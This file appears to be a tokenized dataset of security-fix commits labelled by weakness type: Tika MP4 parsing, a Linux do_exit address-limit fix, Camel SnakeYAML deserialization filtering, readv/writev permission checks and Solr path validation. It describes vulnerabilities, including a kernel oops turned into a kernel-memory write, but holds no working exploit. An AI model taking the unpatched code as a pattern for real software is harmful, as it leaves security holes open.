");", "if", "(", "samples", "!", "=", "null", ")", "{", "SampleDescriptionBox", "sampleDesc", "=", "samples", ".", "getSampleDescriptionBox", "(", ");", "if", "(", "sampleDesc", "!", "=", "null", ")", "{", "/", "/", "Look", "for", "the", "first", "Audio", "Sample", ",", "if", "present", "AudioSampleEntry", "sample", "=", "getOrNull", "(", "sampleDesc", ",", "AudioSampleEntry", ".", "class", ")", ";", "if", "(", "sample", "!", "=", "null", ")", "{", "XMPDM", ".", "ChannelTypePropertyConverter", ".", "convertAndSet", "(", "metadata", ",", "sample", ".", "getChannelCount", "(", "))", ";", "/", "/", "metadata", ".", "set", "(", "XMPDM", ".", "AUDIO_SAMPLE_TYPE", ",", "sample", ".", "getSampleSize", "(", "))", ";", "/", "/", "TODO", "Num", "-", ">", "Type", "mapping", "metadata", ".", "set", "(", "XMPDM", ".", "AUDIO_SAMPLE_RATE", ",", "(", "int", ")", "sample", ".", "getSampleRate", "(", "))", ";", "/", "/", "metadata", ".", "set", "(", "XMPDM", ".", "AUDIO_", ",", "sample", ".", "getSamplesPerPacket", "(", "))", ";", "/", "/", "metadata", ".", "set", "(", "XMPDM", ".", "AUDIO_", ",", "sample", ".", "getBytesPerSample", "(", "))", ";", "}", "}", "}", "}", "}", "/", "/", "Get", "metadata", "from", "the", "User", "Data", "Box", "UserDataBox", "userData", "=", "getOrNull", "(", "moov", ",", "UserDataBox", ".", "class", ")", ";", "if", "(", "userData", "!", "=", "null", ")", "{", "extractGPS", "(", "userData", ",", "metadata", ")", ";", "MetaBox", "meta", "=", "getOrNull", "(", "userData", ",", "MetaBox", ".", "class", ")", ";", "/", "/", "Check", "for", "iTunes", "Metadata", "/", "/", "See", "http", ":", "//", "atomicparsley", ".", "sourceforge", ".", "net", "/", "mpeg", "-", "4files", ".", "html", "and", "/", "/", "http", ":", "//", "code", ".", "google", ".", "com", "/", "p", "/", "mp4v2", "/", "wiki", "/", "iTunesMetadata", "for", "more", "on", "these", "AppleItemListBox", "apple", "=", "getOrNull", "(", "meta", ",", "AppleItemListBox", ".", "class", ")", ";", "if", "(", "apple", "!", "=", "null", ")", "{", "/", "/", "Title", "AppleNameBox", "title", "=", "getOrNull", "(", "apple", ",", "AppleNameBox", ".", "class", ")", ";", "addMetadata", "(", "TikaCoreProperties", ".", "TITLE", ",", "metadata", ",", "title", ")", ";", "/", "/", "Artist", "AppleArtistBox", "artist", "=", "getOrNull", "(", "apple", ",", "AppleArtistBox", ".", "class", ")", ";", "addMetadata", "(", "TikaCoreProperties", ".", "CREATOR", ",", "metadata", ",", "artist", ")", ";", "addMetadata", "(", "XMPDM", ".", "ARTIST", ",", "metadata", ",", "artist", ")", ";", "/", "/", "Album", "Artist", "AppleArtist2Box", "artist2", "=", "getOrNull", "(", "apple", ",", "AppleArtist2Box", ".", "class", ")", ";", "addMetadata", "(", "XMPDM", ".", "ALBUM_ARTIST", ",", "metadata", ",", "artist2", ")", ";", "/", "/", "Album", "AppleAlbumBox", "album", "=", "getOrNull", "(", "apple", ",", "AppleAlbumBox", ".", "class", ")", ";", "addMetadata", "(", "XMPDM", ".", "ALBUM", ",", "metadata", ",", "album", ")", ";", "/", "/", "Composer", "AppleTrackAuthorBox", "composer", "=", "getOrNull", "(", "apple", ",", "AppleTrackAuthorBox", ".", "class", ")", ";", "addMetadata", "(", "XMPDM", ".", "COMPOSER", ",", "metadata", ",", "composer", ")", ";", "/", "/", "Genre", "AppleGenreBox", "genre", "=", "getOrNull", "(", "apple", ",", "AppleGenreBox", ".", "class", ")", ";", "addMetadata", "(", "XMPDM", ".", "GENRE", ",", "metadata", ",", "genre", ")", ";", "/", "/", "Year", "AppleRecordingYear2Box", "year", "=", "getOrNull", "(", "apple", ",", "AppleRecordingYear2Box", ".", "class", ")", ";", "if", "(", "year", "!", "=", "null", ")", "{", "metadata", ".", "set", "(", "XMPDM", ".", "RELEASE_DATE", ",", "year", ".", "getValue", "(", "))", ";", "}", "/", "/", "Track", "number", "AppleTrackNumberBox", "trackNum", "=", "getOrNull", "(", "apple", ",", "AppleTrackNumberBox", ".", "class", ")", ";", "if", "(", "trackNum", "!", "=", "null", ")", "{", "metadata", ".", "set", "(", "XMPDM", ".", "TRACK_NUMBER", ",", "trackNum", ".", "getA", "(", "))", ";", "/", "/", "metadata", ".", "set", "(", "XMPDM", ".", "NUMBER_OF_TRACKS", ",", "trackNum", ".", "getB", "(", "))", ";", "/", "/", "TODO", "}", "/", "/", "Disc", "number", "AppleDiskNumberBox", "discNum", "=", "getOrNull", "(", "apple", ",", "AppleDiskNumberBox", ".", "class", ")", ";", "if", "(", "discNum", "!", "=", "null", ")", "{", "metadata", ".", "set", "(", "XMPDM", ".", "DISC_NUMBER", ",", "discNum", ".", "getA", "(", "))", ";", "}", "/", "/", "Compilation", "AppleCompilationBox", "compilation", "=", "getOrNull", "(", "apple", ",", "AppleCompilationBox", ".", "class", ")", ";", "if", "(", "compilation", "!", "=", "null", ")", "{", "metadata", ".", "set", "(", "XMPDM", ".", "COMPILATION", ",", "(", "int", ")", "compilation", ".", "getValue", "(", "))", ";", "}", "/", "/", "Comment", "AppleCommentBox", "comment", "=", "getOrNull", "(", "apple", ",", "AppleCommentBox", ".", "class", ")", ";", "addMetadata", "(", "XMPDM", ".", "LOG_COMMENT", ",", "metadata", ",", "comment", ")", ";", "/", "/", "Encoder", "AppleEncoderBox", "encoder", "=", "getOrNull", "(", "apple", ",", "AppleEncoderBox", ".", "class", ")", ";", "if", "(", "encoder", "!", "=", "null", ")", "{", "metadata", ".", "set", "(", "XMP", ".", "CREATOR_TOOL", ",", "encoder", ".", "getValue", "(", "))", ";", "}", "/", "/", "As", "text", "for", "(", "Box", "box", ":", "apple", ".", "getBoxes", "(", "))", "{", "if", "(", "box", "instanceof", "Utf8AppleDataBox", ")", "{", "xhtml", ".", "element", "(", "\"", "p", "\"", ",", "(", "(", "Utf8AppleDataBox", ")", "box", ")", ".", "getValue", "(", "))", ";", "}", "}", "}", "private", "void", "handleTrackBoxes", "(", "MovieBox", "moov", ",", "Metadata", "metadata", ",", "XHTMLContentHandler", "xhtml", ")", "{", "/", "/", "TODO", "Check", "for", "other", "kinds", "too", "/", "/", "Get", "some", "more", "information", "from", "the", "track", "header", "/", "/", "TODO", "Decide", "how", "to", "handle", "multiple", "tracks", "List", "<", "TrackBox", ">", "tb", "=", "moov", ".", "getBoxes", "(", "TrackBox", ".", "class", ")", ";", "if", "(", "tb", "=", "=", "null", "|", "|", "tb", ".", "size", "(", ")", "=", "=", "0", ")", "{", "return", ";", "}", "TrackBox", "track", "=", "tb", ".", "get", "(", "0", ")", ";", "TrackHeaderBox", "header", "=", "track", ".", "getTrackHeaderBox", "(", ");", "/", "/", "Get", "the", "creation", "and", "modification", "dates", "metadata", ".", "set", "(", "TikaCoreProperties", ".", "CREATED", ",", "header", ".", "getCreationTime", "(", "))", ";", "metadata", ".", "set", "(", "TikaCoreProperties", ".", "MODIFIED", ",", "header", ".", "getModificationTime", "(", "))", ";", "/", "/", "Get", "the", "video", "with", "and", "height", "metadata", ".", "set", "(", "Metadata", ".", "IMAGE_WIDTH", ",", "(", "int", ")", "header", ".", "getWidth", "(", "))", ";", "metadata", ".", "set", "(", "Metadata", ".", "IMAGE_LENGTH", ",", "(", "int", ")", "header", ".", "getHeight", "(", "))", ";", "/", "/", "Get", "the", "sample", "information", "SampleTableBox", "samples", "=", "track", ".", "getSampleTableBox", "(", ");", "if", "(", "samples", "!", "=", "null", ")", "{", "SampleDescriptionBox", "sampleDesc", "=", "samples", ".", "getSampleDescriptionBox", "(", ");", "if", "(", "sampleDesc", "!", "=", "null", ")", "{", "/", "/", "Look", "for", "the", "first", "Audio", "Sample", ",", "if", "present", "AudioSampleEntry", "sample", "=", "getOrNull", "(", "sampleDesc", ",", "AudioSampleEntry", ".", "class", ")", ";", "if", "(", "sample", "!", "=", "null", ")", "{", "XMPDM", ".", "ChannelTypePropertyConverter", ".", "convertAndSet", "(", "metadata", ",", "sample", ".", "getChannelCount", "(", "))", ";", "/", "/", "metadata", ".", "set", "(", "XMPDM", ".", "AUDIO_SAMPLE_TYPE", ",", "sample", ".", "getSampleSize", "(", "))", ";", "/", "/", "TODO", "Num", "-", ">", "Type", "mapping", "metadata", ".", "set", "(", "XMPDM", ".", "AUDIO_SAMPLE_RATE", ",", "(", "int", ")", "sample", ".", "getSampleRate", "(", "))", ";", "/", "/", "metadata", ".", "set", "(", "XMPDM", ".", "AUDIO_", ",", "sample", ".", "getSamplesPerPacket", "(", "))", ";", "/", "/", "metadata", ".", "set", "(", "XMPDM", ".", "AUDIO_", ",", "sample", ".", "getBytesPerSample", "(", "))", ";", "}", "}", "}", "}", "private", "void", "handleMovieHeaderBox", "(", "MovieBox", "moov", ",", "Metadata", "metadata", ",", "XHTMLContentHandler", "xhtml", ")", "{", "/", "/", "Pull", "out", "some", "information", "from", "the", "header", "box", "MovieHeaderBox", "mHeader", "=", "getOrNull", "(", "moov", ",", "MovieHeaderBox", ".", "class", ")", ";", "if", "(", "mHeader", "=", "=", "null", ")", "{", "return", ";", "}", "/", "/", "Get", "the", "creation", "and", "modification", "dates", "metadata", ".", "set", "(", "TikaCoreProperties", ".", "CREATED", ",", "mHeader", ".", "getCreationTime", "(", "))", ";", "metadata", ".", "set", "(", "TikaCoreProperties", ".", "MODIFIED", ",", "mHeader", ".", "getModificationTime", "(", "))", ";", "/", "/", "Get", "the", "duration", "double", "durationSeconds", "=", "(", "(", "double", ")", "mHeader", ".", "getDuration", "(", "))", "/", "mHeader", ".", "getTimescale", "(", ");", "metadata", ".", "set", "(", "XMPDM", ".", "DURATION", ",", "DURATION_FORMAT", ".", "format", "(", "durationSeconds", ")", ");", "/", "/", "The", "timescale", "is", "normally", "the", "sampling", "rate", "metadata", ".", "set", "(", "XMPDM", ".", "AUDIO_SAMPLE_RATE", ",", "(", "int", ")", "mHeader", ".", "getTimescale", "(", "))", ";", "}", "private", "void", "handleApple", "(", "MetaBox", "metaBox", ",", "Metadata", "metadata", ",", "XHTMLContentHandler", "xhtml", ")", "throws", "SAXException", "{", "AppleItemListBox", "apple", "=", "getOrNull", "(", "metaBox", ",", "AppleItemListBox", ".", "class", ")", ";", "if", "(", "apple", "=", "=", "null", ")", "{", "return", ";", "}", "/", "/", "Title", "AppleNameBox", "title", "=", "getOrNull", "(", "apple", ",", "AppleNameBox", ".", "class", ")", ";", "addMetadata", "(", "TikaCoreProperties", ".", "TITLE", ",", "metadata", ",", "title", ")", ";", "/", "/", "Artist", "AppleArtistBox", "artist", "=", "getOrNull", "(", "apple", ",", "AppleArtistBox", ".", "class", ")", ";", "addMetadata", "(", "TikaCoreProperties", ".", "CREATOR", ",", "metadata", ",", "artist", ")", ";", "addMetadata", "(", "XMPDM", ".", "ARTIST", ",", "metadata", ",", "artist", ")", ";", "/", "/", "Album", "Artist", "AppleArtist2Box", "artist2", "=", "getOrNull", "(", "apple", ",", "AppleArtist2Box", ".", "class", ")", ";", "addMetadata", "(", "XMPDM", ".", "ALBUM_ARTIST", ",", "metadata", ",", "artist2", ")", ";", "/", "/", "Album", "AppleAlbumBox", "album", "=", "getOrNull", "(", "apple", ",", "AppleAlbumBox", ".", "class", ")", ";", "addMetadata", "(", "XMPDM", ".", "ALBUM", ",", "metadata", ",", "album", ")", ";", "/", "/", "Composer", "AppleTrackAuthorBox", "composer", "=", "getOrNull", "(", "apple", ",", "AppleTrackAuthorBox", ".", "class", ")", ";", "addMetadata", "(", "XMPDM", ".", "COMPOSER", ",", "metadata", ",", "composer", ")", ";", "/", "/", "Genre", "AppleGenreBox", "genre", "=", "getOrNull", "(", "apple", ",", "AppleGenreBox", ".", "class", ")", ";", "addMetadata", "(", "XMPDM", ".", "GENRE", ",", "metadata", ",", "genre", ")", ";", "/", "/", "Year", "AppleRecordingYear2Box", "year", "=", "getOrNull", "(", "apple", ",", "AppleRecordingYear2Box", ".", "class", ")", ";", "if", "(", "year", "!", "=", "null", ")", "{", "metadata", ".", "set", "(", "XMPDM", ".", "RELEASE_DATE", ",", "year", ".", "getValue", "(", "))", ";", "}", "/", "/", "Track", "number", "AppleTrackNumberBox", "trackNum", "=", "getOrNull", "(", "apple", ",", "AppleTrackNumberBox", ".", "class", ")", ";", "if", "(", "trackNum", "!", "=", "null", ")", "{", "metadata", ".", "set", "(", "XMPDM", ".", "TRACK_NUMBER", ",", "trackNum", ".", "getA", "(", "))", ";", "/", "/", "metadata", ".", "set", "(", "XMPDM", ".", "NUMBER_OF_TRACKS", ",", "trackNum", ".", "getB", "(", "))", ";", "/", "/", "TODO", "}", "/", "/", "Disc", "number", "AppleDiskNumberBox", "discNum", "=", "getOrNull", "(", "apple", ",", "AppleDiskNumberBox", ".", "class", ")", ";", "if", "(", "discNum", "!", "=", "null", ")", "{", "metadata", ".", "set", "(", "XMPDM", ".", "DISC_NUMBER", ",", "discNum", ".", "getA", "(", "))", ";", "}", "/", "/", "Compilation", "AppleCompilationBox", "compilation", "=", "getOrNull", "(", "apple", ",", "AppleCompilationBox", ".", "class", ")", ";", "if", "(", "compilation", "!", "=", "null", ")", "{", "metadata", ".", "set", "(", "XMPDM", ".", "COMPILATION", ",", "(", "int", ")", "compilation", ".", "getValue", "(", "))", ";", "}", "/", "/", "Comment", "AppleCommentBox", "comment", "=", "getOrNull", "(", "apple", ",", "AppleCommentBox", ".", "class", ")", ";", "addMetadata", "(", "XMPDM", ".", "LOG_COMMENT", ",", "metadata", ",", "comment", ")", ";", "/", "/", "Encoder", "AppleEncoderBox", "encoder", "=", "getOrNull", "(", "apple", ",", "AppleEncoderBox", ".", "class", ")", ";", "if", "(", "encoder", "!", "=", "null", ")", "{", "metadata", ".", "set", "(", "XMP", ".", "CREATOR_TOOL", ",", "encoder", ".", "getValue", "(", "))", ";", "}", "/", "/", "All", "done", "xhtml", ".", "endDocument", "(", ");", "/", "/", "As", "text", "for", "(", "Box", "box", ":", "apple", ".", "getBoxes", "(", "))", "{", "if", "(", "box", "instanceof", "Utf8AppleDataBox", ")", "{", "xhtml", ".", "element", "(", "\"", "p", "\"", ",", "(", "(", "Utf8AppleDataBox", ")", "box", ")", ".", "getValue", "(", "))", ";", "}", "}", "finally", "{", "tmp", ".", "dispose", "(", ");", "}", "}", "/", "**", "*", "Override", "the", "maximum", "record", "size", "limit", ".", "NOTE", ":", "this", "*", "sets", "a", "static", "variable", "on", "the", "IsoFile", "and", "affects", "all", "files", "*", "parsed", "in", "this", "JVM", "!", "!!", "*", "*", "@", "param", "maxRecordSize", "*", "/", "@", "Field", "public", "void", "setMaxRecordSize", "(", "long", "maxRecordSize", ")", "{", "IsoFile", ".", "MAX_RECORD_SIZE_OVERRIDE", "=", "maxRecordSize", ";", "}", "private", "void", "extractGPS", "(", "UserDataBox", "userData", ",", "Metadata", "metadata", ")", "{", "AppleGPSCoordinatesBox", "coordBox", "=", "getOrNull", "(", "userData", ",", "AppleGPSCoordinatesBox", ".", "class", ")", ";", "if", "(", "coordBox", "=", "=", "null", ")", "{", "@", "@", "-", "19", ",", "6", "+", "19", ",", "7", "@", "@", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "import", "java", ".", "io", ".", "InputStream", ";", "import", "java", ".", "nio", ".", "file", ".", "Paths", ";", "import", "org", ".", "apache", ".", "tika", ".", "TikaTest", ";", "import", "org", ".", "apache", ".", "tika", ".", "io", ".", "TikaInputStream", ";"], "docstring_tokens": ["out", "of", "memory", "error"]}
{"contents": ["do_exit():", "make", "sure", "that", "we", "run", "with", "get_fs()", "==", "USER_DS", "If", "a", "user", "manages", "to", "trigger", "an", "oops", "with", "fs", "set", "to", "KERNEL_DS,", "fs", "is", "not", "otherwise", "reset", "before", "do_exit().", "do_exit", "may", "later", "(via", "mm_release", "in", "fork.c)", "do", "a", "put_user", "to", "a", "user-controlled", "address,", "potentially", "allowing", "a", "user", "to", "leverage", "an", "oops", "into", "a", "controlled", "write", "into", "kernel", "memory.", "This", "is", "only", "triggerable", "in", "the", "presence", "of", "another", "bug,", "but", "this", "potentially", "turns", "a", "lot", "of", "DoS", "bugs", "into", "privilege", "escalations,", "so", "it's", "worth", "fixing.", "I", "have", "proof-of-concept", "code", "which", "uses", "this", "bug", "along", "with", "to", "write", "a", "zero", "to", "an", "arbitrary", "kernel", "address,", "so", "I've", "tested", "that", "this", "is", "not", "theoretical.", "A", "more", "logical", "place", "to", "put", "this", "fix", "might", "be", "when", "we", "know", "an", "oops", "has", "occurred,", "before", "we", "call", "do_exit(),", "but", "that", "would", "involve", "changing", "every", "architecture,", "in", "multiple", "places.", "Let's", "just", "stick", "it", "in", "do_exit", "instead.", "[akpm@linux-foundation.org:", "update", "code", "comment]", "Signed-off-by:", "Nelson", "Elhage", "<nelhage@ksplice.com>", "Cc:", "KOSAKI", "Motohiro", "<kosaki.motohiro@jp.fujitsu.com>", "Cc:", "<stable@kernel.org>", "Signed-off-by:", "Andrew", "Morton", "<akpm@linux-foundation.org>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["@", "@", "-", "914", ",", "6", "+", "914", ",", "15", "@", "@", "NORET_TYPE", "void", "do_exit", "(", "long", "code", ")", "if", "(", "unlikely", "(", "!", "tsk", "-", ">", "pid", ")", ")", "panic", "(", "\"", "Attempted", "to", "kill", "the", "idle", "task", "!", "\")", ";", "/", "*", "*", "If", "do_exit", "is", "called", "because", "this", "processes", "oopsed", ",", "it", "'", "s", "possible", "*", "that", "get_fs", "(", ")", "was", "left", "as", "KERNEL_DS", ",", "so", "reset", "it", "to", "USER_DS", "before", "*", "continuing", ".", "Amongst", "other", "possible", "reasons", ",", "this", "is", "to", "prevent", "*", "mm_release", "(", ")-", ">", "clear_child_tid", "(", ")", "from", "writing", "to", "a", "user", "-", "controlled", "*", "kernel", "address", ".", "*", "/", "set_fs", "(", "USER_DS", ")", ";", "tracehook_report_exit", "(", "&", "code", ")", ";", "validate_creds_for_do_exit", "(", "tsk", ")", ";"], "docstring_tokens": ["address", "limit", "override"]}
{"contents": ["CAMEL-10575:", "snakeyaml:", "add", "an", "option", "to", "filter", "classes", "the", "yaml", "parser", "can", "construct"], "code_tokens": ["@", "@", "-", "51", ",", "7", "+", "51", ",", "7", "@", "@", "*", "A", "<", "a", "href", "=", "\"", "http", ":", "//", "camel", ".", "apache", ".", "org", "/", "data", "-", "format", ".", "html", "\"", ">", "data", "format", "<", "/", "a", ">", "(", "{@", "link", "DataFormat", "}", ")", "*", "using", "<", "a", "href", "=", "\"", "http", ":", "//", "www", ".", "snakeyaml", ".", "org", "\"", ">", "SnakeYAML", "<", "/", "a", ">", "to", "marshal", "to", "and", "from", "YAML", ".", "*", "/", "public", "final", "class", "SnakeYAMLDataFormat", "extends", "ServiceSupport", "implements", "DataFormat", ",", "DataFormatName", "{", "public", "class", "SnakeYAMLDataFormat", "extends", "ServiceSupport", "implements", "DataFormat", ",", "DataFormatName", "{", "private", "final", "ThreadLocal", "<", "WeakReference", "<", "Yaml", ">", ">", "yamlCache", ";", "private", "BaseConstructor", "constructor", ";", "private", "Representer", "representer", ";", "@", "@", "-", "77", ",", "7", "+", "77", ",", "9", "@", "@", "public", "SnakeYAMLDataFormat", "(", "Class", "<", "?>", "type", ")", "{", "this", ".", "allowAnyType", "=", "false", ";", "if", "(", "type", "!", "=", "null", ")", "{", "setUnmarshalType", "(", "type", ")", ";", "this", ".", "unmarshalType", "=", "type", ";", "this", ".", "typeFilters", "=", "new", "CopyOnWriteArrayList", "<", ">(", ");", "this", ".", "typeFilters", ".", "add", "(", "TypeFilters", ".", "types", "(", "type", ")", ");", "}", "}"], "docstring_tokens": ["object", "de-serialization"]}
{"contents": ["[PATCH]", "readv/writev", "syscalls", "are", "not", "checked", "by", "lsm", "it", "seems", "that", "readv(2)/writev(2)", "syscalls", "do", "not", "call", "file_permission", "callback.", "Looks", "like", "this", "is", "overlook.", "I", "have", "filled", "the", "issue", "into", "redhat", "bugzilla", "as", "https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=169433", "and", "got", "the", "recommendation", "to", "post", "this", "on", "lsm", "mailing", "list.", "The", "following", "trivial", "patch", "solves", "the", "problem.", "Signed-off-by:", "Kostik", "Belousov", "<kostikbel@gmail.com>", "Signed-off-by:", "Chris", "Wright", "<chrisw@osdl.org>"], "code_tokens": ["@", "@", "-", "497", ",", "6", "+", "497", ",", "9", "@", "@", "static", "ssize_t", "do_readv_writev", "(", "int", "type", ",", "struct", "file", "*", "file", ",", "}", "ret", "=", "rw_verify_area", "(", "type", ",", "file", ",", "pos", ",", "tot_len", ")", ";", "if", "(", "ret", ")", "goto", "out", ";", "ret", "=", "security_file_permission", "(", "file", ",", "type", "=", "=", "READ", "?", "MAY_READ", ":", "MAY_WRITE", ")", ";", "if", "(", "ret", ")", "goto", "out", ";"], "docstring_tokens": ["unauthorized", "access"]}
{"contents": ["SOLR-14561", "Followup", "-", "validate", "params", "for", "more", "core", "operations", "(#1629)", "Add", "template", "to", "solr.in", "scripts", "Also", "testes", "Windows", "paths", "Added", "RefGuide", "documentation", "to", "some", "params"], "code_tokens": ["@", "@", "-", "117", ",", "6", "+", "117", ",", "7", "@", "@", "private", "static", "void", "logOnceInfo", "(", "String", "key", ",", "String", "msg", ")", "{", "*", "@", "throws", "SolrException", "if", "path", "is", "outside", "allowed", "paths", "*", "/", "public", "static", "void", "assertPathAllowed", "(", "Path", "pathToAssert", ",", "Set", "<", "Path", ">", "allowPaths", ")", "throws", "SolrException", "{", "if", "(", "pathToAssert", "=", "=", "null", ")", "return", ";", "if", "(", "OS", ".", "isFamilyWindows", "(", ")", "&", "&", "pathToAssert", ".", "toString", "(", ").", "startsWith", "(", "\"\\", "\\\\", "\\\"", "))", "{", "throw", "new", "SolrException", "(", "SolrException", ".", "ErrorCode", ".", "BAD_REQUEST", ",", "\"", "Path", "\"", "+", "pathToAssert", "+", "\"", "disallowed", ".", "UNC", "paths", "not", "supported", ".", "Please", "use", "drive", "letter", "instead", ".", "\")", ";", "@", "@", "-", "324", ",", "10", "+", "324", ",", "13", "@", "@", "public", "boolean", "abortFetch", "(", ")", "{", "}", "}", "@", "SuppressWarnings", "(", "\"", "deprecation", "\"", ")", "private", "void", "deleteSnapshot", "(", "ModifiableSolrParams", "params", ",", "SolrQueryResponse", "rsp", ")", "{", "String", "name", "=", "params", ".", "required", "(", ").", "get", "(", "NAME", ")", ";", "params", ".", "required", "(", ").", "get", "(", "NAME", ")", ";", "SnapShooter", "snapShooter", "=", "new", "SnapShooter", "(", "core", ",", "params", ".", "get", "(", "CoreAdminParams", ".", "BACKUP_LOCATION", ")", ",", "params", ".", "get", "(", "NAME", ")", ");", "String", "location", "=", "params", ".", "get", "(", "CoreAdminParams", ".", "BACKUP_LOCATION", ")", ";", "core", ".", "getCoreContainer", "(", ").", "assertPathAllowed", "(", "location", "=", "=", "null", "?", "null", ":", "Path", ".", "of", "(", "location", ")", ");", "SnapShooter", "snapShooter", "=", "new", "SnapShooter", "(", "core", ",", "location", ",", "params", ".", "get", "(", "NAME", ")", ");", "snapShooter", ".", "validateDeleteSnapshot", "(", ");", "snapShooter", ".", "deleteSnapAsync", "(", "this", ")", ";", "rsp", ".", "add", "(", "STATUS", ",", "OK_STATUS", ")", ";", "@", "@", "-", "448", ",", "7", "+", "451", ",", "6", "@", "@", "private", "void", "restore", "(", "SolrParams", "params", ",", "SolrQueryResponse", "rsp", ",", "SolrQueryRequest", "}", "String", "name", "=", "params", ".", "get", "(", "NAME", ")", ";", "String", "location", "=", "params", ".", "get", "(", "CoreAdminParams", ".", "BACKUP_LOCATION", ")", ";", "String", "repoName", "=", "params", ".", "get", "(", "CoreAdminParams", ".", "BACKUP_REPOSITORY", ")", ";", "CoreContainer", "cc", "=", "core", ".", "getCoreContainer", "(", ");", "BackupRepository", "repo", "=", "null", ";", "@", "@", "-", "460", ",", "11", "+", "462", ",", "13", "@", "@", "private", "void", "restore", "(", "SolrParams", "params", ",", "SolrQueryResponse", "rsp", ",", "SolrQueryRequest", "}", "}", "else", "{", "repo", "=", "new", "LocalFileSystemRepository", "(", ");", "/", "/", "If", "location", "is", "not", "provided", "then", "assume", "that", "the", "restore", "index", "is", "present", "inside", "the", "data", "directory", ".", "if", "(", "location", "=", "=", "null", ")", "{", "location", "=", "core", ".", "getDataDir", "(", ");", "}", "}", "/", "/", "If", "location", "is", "not", "provided", "then", "assume", "that", "the", "restore", "index", "is", "present", "inside", "the", "data", "directory", ".", "if", "(", "location", "=", "=", "null", ")", "{", "location", "=", "core", ".", "getDataDir", "(", ");", "if", "(", "\"", "file", "\"", ".", "equals", "(", "repo", ".", "createURI", "(", "\"", "x", "\"", ").", "getScheme", "(", "))", ")", "{", "core", ".", "getCoreContainer", "(", ").", "assertPathAllowed", "(", "Paths", ".", "get", "(", "location", ")", ");", "}", "URI", "locationUri", "=", "repo", ".", "createURI", "(", "location", ")", ";", "@", "@", "-", "573", ",", "8", "+", "577", ",", "11", "@", "@", "private", "void", "doSnapShoot", "(", "SolrParams", "params", ",", "SolrQueryResponse", "rsp", ",", "SolrQueryRequ", "location", "=", "core", ".", "getCoreDescriptor", "(", ").", "getInstanceDir", "(", ").", "resolve", "(", "location", ")", ".", "normalize", "(", ").", "toString", "(", ");", "}", "}", "if", "(", "\"", "file", "\"", ".", "equals", "(", "repo", ".", "createURI", "(", "\"", "x", "\"", ").", "getScheme", "(", "))", ")", "{", "core", ".", "getCoreContainer", "(", ").", "assertPathAllowed", "(", "Paths", ".", "get", "(", "location", ")", ");", "}", "/", "/", "small", "race", "here", "before", "the", "commit", "point", "is", "saved", "/", "/", "small", "race", "here", "before", "the", "commit", "point", "is", "saved", "URI", "locationUri", "=", "repo", ".", "createURI", "(", "location", ")", ";", "String", "commitName", "=", "params", ".", "get", "(", "CoreAdminParams", ".", "COMMIT_NAME", ")", ";", "SnapShooter", "snapShooter", "=", "new", "SnapShooter", "(", "repo", ",", "core", ",", "locationUri", ",", "params", ".", "get", "(", "NAME", ")", ",", "commitName", ")", ";", "@", "@", "-", "86", ",", "6", "+", "86", ",", "9", "@", "@", "private", "void", "initialize", "(", "BackupRepository", "backupRepo", ",", "SolrCore", "core", ",", "URI", "location", "this", ".", "backupRepo", "=", "Objects", ".", "requireNonNull", "(", "backupRepo", ")", ";", "this", ".", "baseSnapDirPath", "=", "location", ";", "this", ".", "snapshotName", "=", "snapshotName", ";", "if", "(", "\"", "file", "\"", ".", "equals", "(", "location", ".", "getScheme", "(", "))", ")", "{", "solrCore", ".", "getCoreContainer", "(", ").", "assertPathAllowed", "(", "Paths", ".", "get", "(", "location", ")", ");", "}", "if", "(", "snapshotName", "!", "=", "null", ")", "{", "directoryName", "=", "\"", "snapshot", ".", "\"", "+", "snapshotName", ";", "}", "else", "{", "@", "@", "-", "18", ",", "10", "+", "18", ",", "8", "@", "@", "package", "org", ".", "apache", ".", "solr", ".", "handler", ".", "admin", ";", "import", "java", ".", "lang", ".", "invoke", ".", "MethodHandles", ";", "import", "java", ".", "util", ".", "HashMap", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "java", ".", "nio", ".", "file", ".", "Paths", ";", "import", "java", ".", "util", ".", "*;", "import", "com", ".", "google", ".", "common", ".", "collect", ".", "Lists", ";", "import", "org", ".", "apache", ".", "lucene", ".", "index", ".", "DirectoryReader", ";", "@", "@", "-", "79", ",", "6", "+", "77", ",", "8", "@", "@", "public", "void", "execute", "(", "CoreAdminHandler", ".", "CallInfo", "it", ")", "throws", "Exception", "{", "sourceCores", ".", "add", "(", "srcCore", ")", ";", "}", "}", "else", "{", "/", "/", "Validate", "each", "'", "indexDir", "'", "input", "as", "valid", "Arrays", ".", "stream", "(", "dirNames", ")", ".", "forEach", "(", "indexDir", "-", ">", "core", ".", "getCoreContainer", "(", ").", "assertPathAllowed", "(", "Paths", ".", "get", "(", "indexDir", ")", "))", ";", "DirectoryFactory", "dirFactory", "=", "core", ".", "getDirectoryFactory", "(", ");", "for", "(", "int", "i", "=", "0", ";", "i", "<", "dirNames", ".", "length", ";", "i", "+", "+)", "{", "boolean", "markAsDone", "=", "false", ";", "@", "@", "-", "404", ",", "8", "+", "404", ",", "9", "@", "@", "private", "void", "brindDownShardIndexSomeDocsAndRecover", "(", ")", "throws", "Exception", "{", "params", ".", "set", "(", "\"", "qt", "\"", ",", "ReplicationHandler", ".", "PATH", ")", ";", "params", ".", "set", "(", "\"", "command", "\"", ",", "\"", "backup", "\"", ");", "params", ".", "set", "(", "\"", "name", "\"", ",", "backupName", ")", ";", "Path", "location", "=", "createTempDir", "(", ");", "location", "=", "FilterPath", ".", "unwrap", "(", "location", ")", ".", "toRealPath", "(", ");", "final", "Path", "location", "=", "FilterPath", ".", "unwrap", "(", "createTempDir", "(", "))", ".", "toRealPath", "(", ");", "/", "/", "Allow", "non", "-", "standard", "location", "outside", "SOLR_HOME", "jettys", ".", "forEach", "(", "j", "-", ">", "j", ".", "getCoreContainer", "(", ").", "getAllowPaths", "(", ").", "add", "(", "location", ")", ");", "params", ".", "set", "(", "\"", "location", "\"", ",", "location", ".", "toString", "(", "))", ";", "QueryRequest", "request", "=", "new", "QueryRequest", "(", "params", ")", ";", "@", "@", "-", "47", ",", "6", "+", "47", ",", "7", "@", "@", "import", "org", ".", "apache", ".", "solr", ".", "common", ".", "cloud", ".", "Slice", ";", "import", "org", ".", "apache", ".", "solr", ".", "common", ".", "params", ".", "CollectionAdminParams", ";", "import", "org", ".", "apache", ".", "solr", ".", "common", ".", "params", ".", "CoreAdminParams", ";", "import", "org", ".", "junit", ".", "AfterClass", ";", "import", "org", 